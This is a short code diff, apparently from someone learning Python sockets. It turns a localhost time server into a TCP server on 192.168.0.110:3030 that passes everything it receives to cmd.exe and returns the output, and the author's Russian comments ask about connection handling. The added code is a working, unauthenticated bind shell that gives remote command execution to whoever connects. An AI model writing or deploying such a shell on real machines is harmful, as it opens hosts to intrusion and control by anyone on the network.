@@ -1,16 +1,27 @@
-import socket
-from datetime import datetime
+#!/usr/bin/python3.5
+from  socket import *
+import subprocess, time
 
-server = socket.socket()
+# Sever
+sock=socket(AF_INET,SOCK_STREAM)
+sock.bind(('192.168.0.110',3030))
+sock.listen(1)
 
-server.bind(('localhost', 3030)) # Привязываем серверный сокет к localhost и 3030 порту.
-server.listen(5) # Начинаем прослушивать входящие соединения.
-
-print("Start")
 while True:
-    conn, _ = server.accept()
-    data = conn.recv(1024) # Получаем данные из сокета.
-    print(data.decode('utf-8'))
-    message = datetime.now().strftime("%H:%M:%S")  # отправляем текущее время
-    conn.send(message.encode())      # отправляем сообщение клиенту
-    conn.close()                     # закрываем подключение
+    conn, addr = sock.accept()
+    print ('Server connect by ',addr)
+    while True:
+
+        try:
+            data=conn.recv(1024)
+        except:
+            break
+        if not data:
+            break
+      
+        result=subprocess.run(['cmd.exe'], stdout=subprocess.PIPE,stderr=subprocess.PIPE, input=data)
+        conn.send(result.stdout) 
+        conn.send(result.stderr)
+# Интересный момент, может кто знает, у меня так нормальна не заработало, если conn.close() вынести с тела второго цикла.
+# В примерах у того же Лутца, соединения закрывают в теле первого цикла. Ладно буду розбератся
+        conn.close()
